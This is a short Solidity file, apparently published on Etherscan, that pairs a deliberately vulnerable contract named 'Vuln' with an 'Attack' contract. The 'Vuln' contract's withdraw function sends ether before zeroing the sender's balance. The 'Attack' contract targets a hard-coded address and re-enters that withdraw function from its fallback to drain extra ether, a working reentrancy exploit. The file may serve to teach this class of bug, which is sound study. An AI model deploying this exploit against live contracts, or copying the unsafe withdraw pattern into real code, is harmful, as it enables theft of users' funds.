/**
 *Submitted for verification at Etherscan.io on 2021-12-03
*/

pragma solidity ^0.6.0;

contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}




contract Attack{
    Vuln vulnerable = Vuln(address(0x36A540E3A78084962B75E25877CfACf8846Be018));
    int256 i =0;

    function steal() public payable{
        vulnerable.deposit{value: 0.01 ether}();
        vulnerable.withdraw();
    }

    fallback() external payable{
        if (i<=1){
            i+=1;
            vulnerable.withdraw();
        }
        
    }

}